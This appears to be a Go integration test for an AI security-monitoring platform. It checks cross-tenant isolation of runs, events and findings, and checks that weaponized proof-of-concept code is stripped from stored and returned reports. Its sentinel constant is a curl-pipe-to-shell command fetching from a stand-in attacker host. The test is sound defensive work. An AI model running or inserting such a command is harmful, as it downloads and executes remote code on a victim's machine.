//go:build integration

package server

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/jackc/pgx/v5/pgxpool"
	"github.com/testcontainers/testcontainers-go"
	tcpostgres "github.com/testcontainers/testcontainers-go/modules/postgres"
	"github.com/testcontainers/testcontainers-go/wait"
	"golang.org/x/crypto/bcrypt"

	"github.com/bellu/bellu-ai-cyber/internal/auth"
	"github.com/bellu/bellu-ai-cyber/internal/finding"
	"github.com/bellu/bellu-ai-cyber/internal/store"
)

// This file is the consolidated safety review (task 24.2) for the fully
// integrated continuous-monitoring system. Where monitor_loop_integration_test.go
// proves the loop CONNECTS end to end, this file proves the two cross-cutting
// SAFETY invariants hold across every new seam once that loop is wired, driven
// through the real Server.Handler() HTTP stack over a real Postgres
// (testcontainers). It is gated behind the `integration` build tag so it only
// runs when a container runtime is available
// (`go test -tags integration ./backend/server/...`).
//
// It is a separate file from the other integration/property files and uses its
// own distinctly named harness (prefix safety*) so all of them coexist in the
// same package build without symbol collisions. It reuses the TWO-ORG shape of
// trace_property_test.go's newTraceEnv (two agent-service-account principals in
// two distinct orgs) so the cross-org tenant-isolation assertions are possible.
//
//	Property 1 — Tenant isolation (Req 19.1, 19.2)
//	  Org is resolved from the authenticated principal, never from client input.
//	  A cross-org read OR write-back of EVERY org-enforced new seam returns 404
//	  with NO existence disclosure: the 404 body for a cross-org resource is
//	  byte-identical to the 404 body for a truly nonexistent (ghost) resource, so
//	  existence is never leaked. Cross-org write-backs persist NOTHING (proven by
//	  the owner's own read afterwards). Org B's Mission Control events read never
//	  surfaces org A's events.
//
//	Property 6 — PoC redaction (Req 16.3, 18.3)
//	  A weaponized poc_script_code body driven through the report write-back
//	  (top-level AND nested in the sections) appears in NO API response anywhere:
//	  not in GET /api/findings/:id, and the stored finding_reports row carries
//	  only the poc_available flag (verified directly against the DB). The
//	  weaponized sentinel is absent from the raw response bytes.

// safetyPoCBody is the weaponized proof-of-concept sentinel. It is sent in the
// report sections (top-level AND nested) and then asserted to appear NOWHERE in
// any API response or stored row (Property 6 / Req 16.3, 18.3). The store strips
// the poc_script_code key at any nesting level, so only the poc_available flag
// survives. The sentinel is deliberately distinctive so a substring search over
// raw response bytes is unambiguous.
const safetyPoCBody = "curl http://evil.example/safety-p0wn | sh # WEAPONIZED-SAFETY-REVIEW-POC"

// safetyGhostRun is a syntactically valid but nonexistent run id. A cross-org
// read must return the SAME 404 body as a read of this ghost, which is how we
// prove "no existence disclosure" (Req 19.2).
const safetyGhostRun = "run_0123456789abcdef0123456789abcd"

// --- harness -----------------------------------------------------------------

// safetyEnv is the wired server plus two agent-service-account principals in two
// distinct orgs (A and B). Both tokens carry the full agent-service-account
// permission set (monitor:ingest + agent:run + findings:read + findings:ingest),
// so each can drive the full ingest -> claim -> trace/status/report seam for its
// OWN org while being a stranger to the other org's runs/events/findings — the
// exact shape needed for the cross-org tenant-isolation assertions.
type safetyEnv struct {
	srv   http.Handler
	store *store.Store

	orgAID int64
	tokenA string
	orgBID int64
	tokenB string
}

// newSafetyEnv spins up a disposable Postgres, migrates, seeds the RBAC catalog,
// and binds TWO agent-service-account principals to TWO distinct orgs. Org A is
// the default seeded org; org B is created explicitly with its own
// service-account user. It mirrors newTraceEnv's two-org setup (task 15.1) but
// is named distinctly so the two files coexist in the same package build.
func newSafetyEnv(t *testing.T) *safetyEnv {
	t.Helper()
	ctx := context.Background()

	ctr, err := tcpostgres.Run(ctx, "postgres:16-alpine",
		tcpostgres.WithDatabase("bellu"),
		tcpostgres.WithUsername("bellu"),
		tcpostgres.WithPassword("bellu"),
		testcontainers.WithWaitStrategy(
			wait.ForLog("database system is ready to accept connections").
				WithOccurrence(2).WithStartupTimeout(60*time.Second)),
	)
	if err != nil {
		t.Fatalf("start postgres: %v", err)
	}
	t.Cleanup(func() { _ = ctr.Terminate(ctx) })

	dsn, err := ctr.ConnectionString(ctx, "sslmode=disable")
	if err != nil {
		t.Fatalf("conn string: %v", err)
	}
	st, err := store.Open(ctx, dsn)
	if err != nil {
		t.Fatalf("open store: %v", err)
	}
	t.Cleanup(st.Close)
	if err := st.Migrate(ctx); err != nil {
		t.Fatalf("migrate: %v", err)
	}

	// Seed the RBAC catalog (permissions + built-in roles, incl. the agent
	// service account) and org A (the default seeded org).
	authStore := auth.NewStore(st.Pool())
	const adminEmail, adminPassword = "admin@bellu.test", "admin-secret"
	if _, err := authStore.Seed(ctx, adminEmail, adminPassword, "Org A"); err != nil {
		t.Fatalf("seed rbac: %v", err)
	}

	var orgAID int64
	if err := st.Pool().QueryRow(ctx,
		`SELECT id FROM organizations ORDER BY id LIMIT 1`).Scan(&orgAID); err != nil {
		t.Fatalf("read org A: %v", err)
	}
	const saAEmail, saAPassword = "svc-a@bellu.test", "svc-a-secret"
	safetySeedServiceAccount(t, ctx, st.Pool(), orgAID, saAEmail, saAPassword)

	// Org B: a SECOND org with its OWN agent-service-account principal — the
	// stranger tenant used to prove cross-org isolation.
	var orgBID int64
	if err := st.Pool().QueryRow(ctx,
		`INSERT INTO organizations (name) VALUES ('Org B') RETURNING id`).Scan(&orgBID); err != nil {
		t.Fatalf("create org B: %v", err)
	}
	const saBEmail, saBPassword = "svc-b@bellu.test", "svc-b-secret"
	safetySeedServiceAccount(t, ctx, st.Pool(), orgBID, saBEmail, saBPassword)

	tokens := auth.NewTokenManager("test-secret", time.Hour)
	svc := auth.NewService(authStore, tokens)
	srv := New(Options{Store: st, Auth: svc}).Handler()

	return &safetyEnv{
		srv:    srv,
		store:  st,
		orgAID: orgAID,
		tokenA: safetyLogin(t, srv, saAEmail, saAPassword),
		orgBID: orgBID,
		tokenB: safetyLogin(t, srv, saBEmail, saBPassword),
	}
}

// safetySeedServiceAccount inserts an active user bound org-wide (project NULL)
// to the agent-service-account role for the GIVEN org. The principal's org is
// the user's org_id column, so binding the user to orgID is what makes that
// token act as — and only see — that org (tenant isolation). Named distinctly
// to avoid colliding with the other files' seed helpers in the same build.
func safetySeedServiceAccount(t *testing.T, ctx context.Context, pool *pgxpool.Pool, orgID int64, email, password string) {
	t.Helper()
	hash, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		t.Fatalf("hash password: %v", err)
	}
	var userID int64
	if err := pool.QueryRow(ctx,
		`INSERT INTO users (org_id, email, name, password_hash, active)
		 VALUES ($1,$2,$3,$4,true) RETURNING id`,
		orgID, email, email, string(hash)).Scan(&userID); err != nil {
		t.Fatalf("insert user %s: %v", email, err)
	}
	var roleID int64
	if err := pool.QueryRow(ctx,
		`SELECT id FROM roles WHERE key=$1 AND builtin`, auth.RoleAgentServiceAccount).Scan(&roleID); err != nil {
		t.Fatalf("read role %s: %v", auth.RoleAgentServiceAccount, err)
	}
	if _, err := pool.Exec(ctx,
		`INSERT INTO memberships (user_id, role_id, project_id) VALUES ($1,$2,NULL)`,
		userID, roleID); err != nil {
		t.Fatalf("insert membership %s: %v", email, err)
	}
}

// safetyLogin posts credentials to /api/auth/login and returns the issued JWT.
func safetyLogin(t *testing.T, srv http.Handler, email, password string) string {
	t.Helper()
	body, _ := json.Marshal(map[string]string{"email": email, "password": password})
	req := httptest.NewRequest("POST", "/api/auth/login", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	rec := httptest.NewRecorder()
	srv.ServeHTTP(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("login %s: status %d, body %s", email, rec.Code, rec.Body.String())
	}
	var out struct {
		Token string `json:"token"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &out); err != nil {
		t.Fatalf("login %s: decode: %v", email, err)
	}
	if out.Token == "" {
		t.Fatalf("login %s: empty token", email)
	}
	return out.Token
}

// safetyDoJSON issues an authenticated request (with the given bearer token) and
// an optional JSON body, returning the recorder. A nil body sends no payload.
func (e *safetyEnv) safetyDoJSON(t *testing.T, token, method, path string, body any) *httptest.ResponseRecorder {
	t.Helper()
	var r *http.Request
	if body != nil {
		buf, err := json.Marshal(body)
		if err != nil {
			t.Fatalf("marshal %s %s body: %v", method, path, err)
		}
		r = httptest.NewRequest(method, path, bytes.NewReader(buf))
		r.Header.Set("Content-Type", "application/json")
	} else {
		r = httptest.NewRequest(method, path, nil)
	}
	r.Header.Set("Authorization", "Bearer "+token)
	rec := httptest.NewRecorder()
	e.srv.ServeHTTP(rec, r)
	return rec
}

// safetyDecode unmarshals a recorder's JSON body into v, failing on a status
// other than wantCode.
func safetyDecode(t *testing.T, rec *httptest.ResponseRecorder, wantCode int, v any) {
	t.Helper()
	if rec.Code != wantCode {
		t.Fatalf("status %d, want %d (body %s)", rec.Code, wantCode, rec.Body.String())
	}
	if v != nil {
		if err := json.Unmarshal(rec.Body.Bytes(), v); err != nil {
			t.Fatalf("decode body %q: %v", rec.Body.String(), err)
		}
	}
}

// safetyItoa renders an int64 as a decimal string for path building.
func safetyItoa(n int64) string { return strconv.FormatInt(n, 10) }

// safetyMustJSON marshals v to json.RawMessage, failing the test on error.
func safetyMustJSON(t *testing.T, v any) json.RawMessage {
	t.Helper()
	b, err := json.Marshal(v)
	if err != nil {
		t.Fatalf("marshal json: %v", err)
	}
	return b
}

// safetyLaunchRun drives ingest -> claim for the given principal's org and
// returns the run id of the read-only run launched for the claimed event. Each
// call uses a unique delivery id so repeated launches never collide on the
// (org, source, delivery_id) idempotency key. canonicalID is the target the
// auto-triggered run keys on.
func (e *safetyEnv) safetyLaunchRun(t *testing.T, token, deliveryID, canonicalID string) string {
	t.Helper()

	// A GitHub check_run payload classifies to event_kind "ci", which the static
	// routing table routes to the red_team, so the event becomes claimable.
	payload := safetyMustJSON(t, map[string]any{
		"event_type":   "check_run",
		"check_run":    map[string]any{"status": "completed", "conclusion": "failure"},
		"canonical_id": canonicalID,
	})

	var ingested struct {
		ID    int64  `json:"id"`
		State string `json:"state"`
	}
	safetyDecode(t, e.safetyDoJSON(t, token, "POST", "/api/monitor/events", map[string]any{
		"source":      "github",
		"delivery_id": deliveryID,
		"payload":     payload,
	}), http.StatusAccepted, &ingested)
	if ingested.State != "routed" {
		t.Fatalf("ingest state = %q, want routed", ingested.State)
	}

	var claimResp struct {
		Claims []struct {
			ID    int64  `json:"id"`
			RunID string `json:"run_id"`
		} `json:"claims"`
	}
	safetyDecode(t, e.safetyDoJSON(t, token, "POST", "/api/agent/monitor/claim", map[string]any{"limit": 10}),
		http.StatusOK, &claimResp)
	for _, cl := range claimResp.Claims {
		if cl.ID == ingested.ID {
			if cl.RunID == "" {
				t.Fatalf("claim launched no run for event %d", ingested.ID)
			}
			return cl.RunID
		}
	}
	t.Fatalf("claim did not return the ingested event %d (claims %+v)", ingested.ID, claimResp.Claims)
	return ""
}

// safetyFindingID resolves a finding's surrogate id from its (asset_id, vuln_id)
// dedup key by querying the store directly — the test needs the numeric id to
// hit GET /api/findings/:id, and the ingest response does not return it.
func (e *safetyEnv) safetyFindingID(t *testing.T, assetID, vulnID string) int64 {
	t.Helper()
	id, err := finding.NewStore(e.store).GetIDByKey(context.Background(), assetID, vulnID)
	if err != nil {
		t.Fatalf("resolve finding id (%s/%s): %v", assetID, vulnID, err)
	}
	return id
}

// --- Property 1: tenant isolation across every new seam ----------------------

// TestSafetyReviewTenantIsolation proves Property 1 across the fully integrated
// system (Req 19.1, 19.2): org B, a stranger tenant, cannot read or affect org
// A's runs, events, or findings through ANY org-enforced seam. For every
// cross-org read/write-back the response is a 404 whose body is byte-identical
// to the 404 for a truly nonexistent (ghost) resource — so existence is never
// disclosed — and every rejected cross-org write-back persists nothing (proven
// by org A's own read afterwards).
//
// NOTE on the finding seams: findings are not org-partitioned at the row level
// (internal/finding/store.go resolves purely on the dedup key). The tenant
// boundary for a finding is carried in its ORG-SCOPED synthetic asset_id for
// raw targets (syntheticAssetID embeds the org, so it is unforgeable across
// orgs). The report write-back asserts exactly that enforced boundary: org B
// cannot name org A's org-scoped key, so the resolve is a no-disclosure 404 and
// nothing persists. The strict row-level cross-org 404s live on the run/event
// seams (status/detail/timeline/trace/status-write-back/events), which DO carry
// a row-level org check — this file asserts each of those.
func TestSafetyReviewTenantIsolation(t *testing.T) {
	env := newSafetyEnv(t)

	// Baseline: the no-disclosure 404 body every cross-org run seam must match.
	// It is the body returned for a ghost (syntactically valid, nonexistent) run
	// read by org A's OWN token — i.e. a true miss within the caller's own org.
	// Every per-seam assertion below re-derives this ghost body for its own
	// endpoint and asserts byte-equality with the cross-org body; this top-level
	// read just pins the shape so a regression that changed the generic
	// not-found body (e.g. echoing the id) fails loudly and early.
	ghostReadBody := env.safetyDoJSON(t, env.tokenA, "GET", "/api/agent/runs/"+safetyGhostRun, nil)
	if ghostReadBody.Code != http.StatusNotFound {
		t.Fatalf("ghost run read: status %d, want 404 (body %s)", ghostReadBody.Code, ghostReadBody.Body.String())
	}
	if wantNotFound := ghostReadBody.Body.String(); strings.Contains(wantNotFound, safetyGhostRun) {
		t.Fatalf("ghost 404 body echoes the run id %q (existence/identifier disclosure): %s",
			safetyGhostRun, wantNotFound)
	}

	// Org A launches a REAL read-only run and seeds a full trace + finding +
	// report so there is genuine data behind every seam org B will probe.
	const (
		assetA = "repo:github:octo/app-a"
		vulnA  = "CVE-2024-7001"
	)
	runA := env.safetyLaunchRun(t, env.tokenA, "safety-iso-0001", assetA)

	// Seed a trace leg + handoff on run A so detail/timeline have content.
	start := time.Date(2024, 7, 1, 9, 0, 0, 0, time.UTC)
	traceA := map[string]any{
		"agents": []map[string]any{
			{"agent_id": "sa1", "agent_name": "recon-agent", "outcome": "completed",
				"started_at": start, "ended_at": start.Add(10 * time.Second)},
			{"agent_id": "sa2", "agent_name": "exploit-agent", "parent_id": "sa1", "outcome": "completed",
				"started_at": start.Add(10 * time.Second), "ended_at": start.Add(40 * time.Second)},
		},
		"handoffs": []map[string]any{
			{"from_agent_id": "sa1", "to_agent_id": "sa2", "at": start.Add(10 * time.Second)},
		},
	}
	safetyDecode(t, env.safetyDoJSON(t, env.tokenA, "POST", "/api/agent/runs/"+runA+"/trace", traceA),
		http.StatusOK, nil)

	// Seed a finding (org A's org-scoped synthetic asset carries the tenant
	// boundary) and a report linked to run A.
	safetyDecode(t, env.safetyDoJSON(t, env.tokenA, "POST", "/api/agent/findings:ingest", map[string]any{
		"run_id": runA,
		"findings": []map[string]any{
			{"asset_id": assetA, "asset_kind": "Package", "vuln_id": vulnA, "risk_score": 80, "severity": "high"},
		},
	}), http.StatusOK, nil)
	findingA := env.safetyFindingID(t, assetA, vulnA)
	safetyDecode(t, env.safetyDoJSON(t, env.tokenA, "POST", "/api/agent/findings/reports", map[string]any{
		"finding_id": findingA, "run_id": runA, "team": "red",
		"title": "red report", "severity": "high", "poc_available": true,
		"sections":          safetyMustJSON(t, map[string]any{"summary": "a"}),
		"rendered_markdown": "# red",
	}), http.StatusOK, nil)

	// assertNoDisclosure: a cross-org (tokenB) probe of the seam must 404
	// with a body byte-identical to the ghost 404, AND org A's OWN ghost probe
	// of the same seam must 404 with that same body — so a cross-org resource is
	// truly indistinguishable from a nonexistent one (Req 19.2).
	assertNoDisclosure := func(t *testing.T, name, method, crossPath, ghostPath string, body any) {
		t.Helper()
		cross := env.safetyDoJSON(t, env.tokenB, method, crossPath, body)
		if cross.Code != http.StatusNotFound {
			t.Fatalf("%s cross-org: status %d, want 404 (body %s)", name, cross.Code, cross.Body.String())
		}
		ghost := env.safetyDoJSON(t, env.tokenA, method, ghostPath, body)
		if ghost.Code != http.StatusNotFound {
			t.Fatalf("%s ghost: status %d, want 404 (body %s)", name, ghost.Code, ghost.Body.String())
		}
		if cross.Body.String() != ghost.Body.String() {
			t.Fatalf("%s: cross-org 404 body %q differs from ghost 404 body %q (existence disclosure)",
				name, cross.Body.String(), ghost.Body.String())
		}
	}

	// 1) Cross-org READS of run A's status / detail / timeline are no-disclosure
	//    404s, matching the ghost 404 body exactly (Req 19.2).
	assertNoDisclosure(t, "run status read", "GET",
		"/api/agent/runs/"+runA, "/api/agent/runs/"+safetyGhostRun, nil)
	assertNoDisclosure(t, "run detail read", "GET",
		"/api/agent/runs/"+runA+"/detail", "/api/agent/runs/"+safetyGhostRun+"/detail", nil)
	assertNoDisclosure(t, "run timeline read", "GET",
		"/api/agent/runs/"+runA+"/timeline", "/api/agent/runs/"+safetyGhostRun+"/timeline", nil)

	// 2) Cross-org WRITE-BACKS against run A are no-disclosure 404s too. The
	//    trace write-back carries real legs/handoffs that MUST NOT persist; the
	//    status write-back carries a terminal state that MUST NOT fold on.
	crossTrace := map[string]any{
		"agents": []map[string]any{
			{"agent_id": "b1", "agent_name": "recon-agent", "outcome": "completed"},
			{"agent_id": "b2", "agent_name": "exploit-agent", "outcome": "completed"},
		},
		"handoffs": []map[string]any{{"from_agent_id": "b1", "to_agent_id": "b2"}},
	}
	assertNoDisclosure(t, "trace write-back", "POST",
		"/api/agent/runs/"+runA+"/trace", "/api/agent/runs/"+safetyGhostRun+"/trace", crossTrace)
	assertNoDisclosure(t, "status write-back", "PUT",
		"/api/agent/runs/"+runA+"/status", "/api/agent/runs/"+safetyGhostRun+"/status",
		map[string]any{"status": "failed", "findings_count": 99})

	// 3) Org B's finding-report write-back against a finding it does not own is a
	//    no-disclosure 404 when the (asset_id, vuln_id) key does not resolve for
	//    B (Req 15.4, 19.2). This is the enforced tenant boundary for the report
	//    seam: the write-back addresses a finding by its dedup key, and findings
	//    created from a RAW TARGET carry an org-SCOPED synthetic asset id
	//    (syntheticAssetID embeds the org), so B can never name A's raw-target
	//    finding — the key-resolve is a true miss whose 404 body is byte-identical
	//    to a truly nonexistent finding's 404, disclosing no existence.
	//
	//    ARCHITECTURAL NOTE (honest scope of this assertion): the findings table
	//    is not org-partitioned at the row level (see internal/finding/store.go:
	//    GetIDByKey matches purely on the dedup key). The org boundary for
	//    findings is therefore carried in the asset_id itself — org-scoped and
	//    unforgeable for raw targets (asserted here), but a SHARED graph
	//    canonical_id (e.g. a repo both tenants connect) is intentionally not
	//    org-scoped. So this step proves the boundary the system actually
	//    enforces (unforgeable org-scoped keys), not a row-level org check the
	//    finding seam does not implement. The run/event seams below DO enforce a
	//    row-level org check, which is where the strict cross-org 404s live.
	crossKey := map[string]any{
		"asset_id": "synthetic:" + safetyItoa(env.orgBID) + ":b-cannot-forge-a", "vuln_id": vulnA, "team": "red",
		"title": "b report", "severity": "high", "poc_available": true,
		"sections": safetyMustJSON(t, map[string]any{"summary": "b"}),
	}
	ghostKey := map[string]any{
		"asset_id": "repo:github:octo/ghost", "vuln_id": "CVE-0000-0000", "team": "red",
		"title": "ghost", "severity": "low", "poc_available": false,
		"sections": safetyMustJSON(t, map[string]any{"summary": "g"}),
	}
	crossRep := env.safetyDoJSON(t, env.tokenB, "POST", "/api/agent/findings/reports", crossKey)
	if crossRep.Code != http.StatusNotFound {
		t.Fatalf("unresolvable cross-org report key: status %d, want 404 (body %s)", crossRep.Code, crossRep.Body.String())
	}
	ghostRep := env.safetyDoJSON(t, env.tokenB, "POST", "/api/agent/findings/reports", ghostKey)
	if ghostRep.Code != http.StatusNotFound {
		t.Fatalf("ghost report key: status %d, want 404 (body %s)", ghostRep.Code, ghostRep.Body.String())
	}
	if crossRep.Body.String() != ghostRep.Body.String() {
		t.Fatalf("report key-resolve: cross-org 404 body %q differs from ghost 404 body %q (existence disclosure)",
			crossRep.Body.String(), ghostRep.Body.String())
	}

	// 4) Org B's Mission Control events read NEVER surfaces org A's event. Org A
	//    ingested exactly one event (the launch); org B's grid must be empty of
	//    it — in fact empty entirely, since B has ingested nothing.
	var bEvents struct {
		Events []monitorEventView `json:"events"`
	}
	safetyDecode(t, env.safetyDoJSON(t, env.tokenB, "GET", "/api/monitor/events", nil),
		http.StatusOK, &bEvents)
	for _, ev := range bEvents.Events {
		t.Fatalf("org B events grid leaked an event (id %d, source %q): org A's events must be invisible to B",
			ev.ID, ev.Source)
	}
	// Org A still sees its own event, confirming the empty B read is isolation,
	// not a broken read.
	var aEvents struct {
		Events []monitorEventView `json:"events"`
	}
	safetyDecode(t, env.safetyDoJSON(t, env.tokenA, "GET", "/api/monitor/events", nil),
		http.StatusOK, &aEvents)
	if len(aEvents.Events) == 0 {
		t.Fatalf("org A events grid is empty, want its own launch event (isolation sanity)")
	}

	// 5) NOTHING persisted from the rejected cross-org write-backs. Org A's own
	//    reads show the run still carries ONLY A's seeded trace (2 agents / 1
	//    handoff — B's crossTrace of "b1"/"b2" never landed) and is still in a
	//    non-terminal state (B's "failed" status write-back never folded on).
	var detailA struct {
		Status        string `json:"status"`
		AgentsCount   int    `json:"agents_count"`
		HandoffsCount int    `json:"handoffs_count"`
		StageFlow     []struct {
			Stage    string `json:"stage"`
			LegCount int    `json:"leg_count"`
		} `json:"stage_flow"`
	}
	safetyDecode(t, env.safetyDoJSON(t, env.tokenA, "GET", "/api/agent/runs/"+runA+"/detail", nil),
		http.StatusOK, &detailA)
	if detailA.AgentsCount != 2 || detailA.HandoffsCount != 1 {
		t.Fatalf("after cross-org writes, run A counts = %d/%d, want 2/1 (B's trace must not persist)",
			detailA.AgentsCount, detailA.HandoffsCount)
	}
	legByStage := map[string]int{}
	for _, sf := range detailA.StageFlow {
		legByStage[sf.Stage] = sf.LegCount
	}
	// A's seeded legs are RECON + EXPLOIT (one each); B's rejected write used the
	// same stage names, so a leaked persist would have DOUBLED these to 2/2.
	if legByStage["RECON"] != 1 || legByStage["EXPLOIT"] != 1 {
		t.Fatalf("after cross-org trace, run A stage legs RECON=%d EXPLOIT=%d, want 1/1 (B's write must not persist)",
			legByStage["RECON"], legByStage["EXPLOIT"])
	}
	var statusA struct {
		Status        string `json:"status"`
		FindingsCount int    `json:"findings_count"`
	}
	safetyDecode(t, env.safetyDoJSON(t, env.tokenA, "GET", "/api/agent/runs/"+runA, nil),
		http.StatusOK, &statusA)
	if statusA.Status == "failed" || statusA.FindingsCount == 99 {
		t.Fatalf("after cross-org status write-back, run A = %q/%d, want B's write NOT folded on",
			statusA.Status, statusA.FindingsCount)
	}

	// 6) The rejected cross-org report write-back (step 3) persisted NOTHING
	//    against org A's finding: the unforgeable org-scoped key resolved to no
	//    finding, so the findings-table-gated upsert produced no row. A seeded
	//    exactly one report (team "red"), and it must still carry ONLY that red
	//    report — never a second one from B (Req 19.1, 19.2).
	aReports, err := env.store.GetFindingReport(context.Background(), env.orgAID, findingA)
	if err != nil {
		t.Fatalf("read A's finding reports: %v", err)
	}
	if len(aReports) != 1 || aReports[0].Team != "red" {
		t.Fatalf("after cross-org report write-backs, finding A has %d reports %+v, want exactly 1 (red) — B's writes must not persist",
			len(aReports), aReports)
	}
}

// --- Property 6: PoC redaction across the integrated system ------------------

// TestSafetyReviewPoCRedaction proves Property 6 across the fully integrated
// system (Req 16.3, 18.3): a weaponized poc_script_code body driven through the
// report write-back — at the TOP level AND NESTED inside the sections — appears
// in NO API response anywhere, and the stored finding_reports row carries only
// the poc_available flag. The weaponized sentinel is asserted absent from the
// raw response bytes of GET /api/findings/:id, and the stored JSONB sections are
// asserted free of the poc_script_code key at any depth while the benign
// siblings survive.
func TestSafetyReviewPoCRedaction(t *testing.T) {
	env := newSafetyEnv(t)

	const (
		assetA = "repo:github:octo/app-poc"
		vulnA  = "CVE-2024-7777"
	)
	runA := env.safetyLaunchRun(t, env.tokenA, "safety-poc-0001", assetA)

	// Seed the finding the reports attach to.
	safetyDecode(t, env.safetyDoJSON(t, env.tokenA, "POST", "/api/agent/findings:ingest", map[string]any{
		"run_id": runA,
		"findings": []map[string]any{
			{"asset_id": assetA, "asset_kind": "Package", "vuln_id": vulnA, "risk_score": 95, "severity": "critical"},
		},
	}), http.StatusOK, nil)
	findingA := env.safetyFindingID(t, assetA, vulnA)

	// Drive BOTH team reports, each embedding the weaponized body at the TOP
	// level AND NESTED. A benign sibling at each level must survive so we prove
	// the strip removes ONLY the weaponized key, not the whole document.
	for _, team := range []string{"red", "blue"} {
		sections := safetyMustJSON(t, map[string]any{
			"summary":         team + " analysis",
			"poc_script_code": safetyPoCBody, // top-level: MUST be stripped (P6)
			"keep_top":        "benign-top",
			"nested": map[string]any{
				"poc_script_code": safetyPoCBody, // nested: MUST be stripped too (P6)
				"keep_nested":     "benign-nested",
			},
			"list": []any{
				map[string]any{"poc_script_code": safetyPoCBody, "keep_list": "benign-list"},
			},
		})
		safetyDecode(t, env.safetyDoJSON(t, env.tokenA, "POST", "/api/agent/findings/reports", map[string]any{
			"finding_id": findingA, "run_id": runA, "team": team,
			"title": team + " report", "severity": "critical", "poc_available": true,
			"sections":          sections,
			"rendered_markdown": "# " + team + " report",
		}), http.StatusOK, nil)
	}

	// The extended finding read returns both reports, each with poc_available
	// true and the weaponized body NOWHERE in the raw response bytes.
	findRec := env.safetyDoJSON(t, env.tokenA, "GET", "/api/findings/"+safetyItoa(findingA), nil)
	var findResp struct {
		Reports []store.FindingReport `json:"reports"`
	}
	safetyDecode(t, findRec, http.StatusOK, &findResp)
	if len(findResp.Reports) != 2 {
		t.Fatalf("finding detail has %d reports, want 2 (red + blue)", len(findResp.Reports))
	}
	for _, r := range findResp.Reports {
		if !r.PoCAvailable {
			t.Fatalf("report %q poc_available=false, want true (flag only)", r.Team)
		}
		// Each report's sections survived with its benign siblings but lost the
		// weaponized key at every level.
		if !strings.Contains(string(r.Sections), "benign-top") ||
			!strings.Contains(string(r.Sections), "benign-nested") ||
			!strings.Contains(string(r.Sections), "benign-list") {
			t.Fatalf("report %q sections dropped a benign sibling, want them preserved: %s", r.Team, r.Sections)
		}
		if strings.Contains(string(r.Sections), "poc_script_code") {
			t.Fatalf("report %q sections still carry the poc_script_code key (P6 violation): %s", r.Team, r.Sections)
		}
		if strings.Contains(string(r.Sections), safetyPoCBody) {
			t.Fatalf("report %q sections still carry the weaponized PoC body (P6 violation)", r.Team)
		}
	}
	// The single strongest assertion: the weaponized sentinel is absent from the
	// ENTIRE raw response — not in sections, rendered markdown, or anywhere else
	// (Req 16.3, 18.3). The DOM/client-state assertion (Req 18.3) is covered by
	// the frontend vitest suite (task 23.1); here we prove the body never leaves
	// the API, so there is nothing for any client to render.
	if strings.Contains(findRec.Body.String(), safetyPoCBody) {
		t.Fatalf("GET /api/findings/:id leaked the weaponized poc_script_code body in its raw response")
	}

	// Finally, confirm at the SOURCE OF TRUTH: the stored finding_reports rows
	// carry only the poc_available flag and sections free of the weaponized key
	// at any depth — the store stripped it on the way in, so nothing downstream
	// can ever serve it.
	rows, err := env.store.Pool().Query(context.Background(),
		`SELECT team, poc_available, sections::text FROM finding_reports WHERE finding_id = $1 ORDER BY team`,
		findingA)
	if err != nil {
		t.Fatalf("read stored finding_reports: %v", err)
	}
	defer rows.Close()
	storedTeams := 0
	for rows.Next() {
		var team, sections string
		var pocAvailable bool
		if err := rows.Scan(&team, &pocAvailable, &sections); err != nil {
			t.Fatalf("scan stored report: %v", err)
		}
		storedTeams++
		if !pocAvailable {
			t.Fatalf("stored report %q poc_available=false, want true (flag only)", team)
		}
		if strings.Contains(sections, "poc_script_code") || strings.Contains(sections, safetyPoCBody) {
			t.Fatalf("stored report %q sections still carry the weaponized PoC (P6 violation): %s", team, sections)
		}
		if !strings.Contains(sections, "benign-top") || !strings.Contains(sections, "benign-nested") {
			t.Fatalf("stored report %q sections dropped benign siblings: %s", team, sections)
		}
	}
	if err := rows.Err(); err != nil {
		t.Fatalf("iterate stored reports: %v", err)
	}
	if storedTeams != 2 {
		t.Fatalf("stored finding_reports has %d rows, want 2 (red + blue)", storedTeams)
	}
}
